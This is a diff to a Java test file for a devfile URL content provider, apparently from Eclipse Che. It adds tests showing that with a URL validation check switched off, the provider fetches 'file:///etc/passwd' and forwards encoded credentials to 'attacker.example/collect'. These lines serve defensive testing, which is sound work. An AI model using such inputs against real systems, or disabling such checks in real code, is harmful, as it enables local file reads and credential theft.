@@ -17,9 +17,11 @@ import static org.testng.Assert.assertEquals;
 
 import java.net.URI;
 import org.eclipse.che.api.workspace.server.devfile.exception.DevfileException;
+import org.eclipse.che.commons.lang.UrlTargetValidator;
 import org.mockito.ArgumentCaptor;
 import org.mockito.Mock;
 import org.mockito.testng.MockitoTestNGListener;
+import org.testng.annotations.AfterMethod;
 import org.testng.annotations.Listeners;
 import org.testng.annotations.Test;
 
@@ -27,6 +29,11 @@ import org.testng.annotations.Test;
 public class URLFileContentProviderTest {
 
   @Mock private URLFetcher urlFetcher;
+
+  @AfterMethod
+  public void restoreUrlChecks() {
+    UrlTargetValidator.setCheckEnabled(null);
+  }
 
   @Test(
       expectedExceptions = DevfileException.class,
@@ -141,6 +148,29 @@ public class URLFileContentProviderTest {
     provider.fetchContent(url, "user:pass");
 
     verify(urlFetcher).fetch(eq(url), eq(null));
+  }
+
+  @Test
+  public void shouldAcceptAnySchemeWhenTheCheckIsTurnedOff() throws Exception {
+    UrlTargetValidator.setCheckEnabled(false);
+    String url = "file:///etc/passwd";
+    URLFileContentProvider provider = new URLFileContentProvider(null, urlFetcher);
+
+    provider.fetchContent(url);
+
+    verify(urlFetcher).fetch(eq(url), eq(null));
+  }
+
+  @Test
+  public void shouldSendCredentialsToAForeignHostWhenTheCheckIsTurnedOff() throws Exception {
+    UrlTargetValidator.setCheckEnabled(false);
+    String devfileUrl = "https://myhost.com/relative/devfile.yaml";
+    String foreignUrl = "https://attacker.example/collect";
+    URLFileContentProvider provider = new URLFileContentProvider(new URI(devfileUrl), urlFetcher);
+
+    provider.fetchContent(foreignUrl, "user:pass");
+
+    verify(urlFetcher).fetch(eq(foreignUrl), eq("Basic dXNlcjpwYXNz"));
   }
 
   @Test
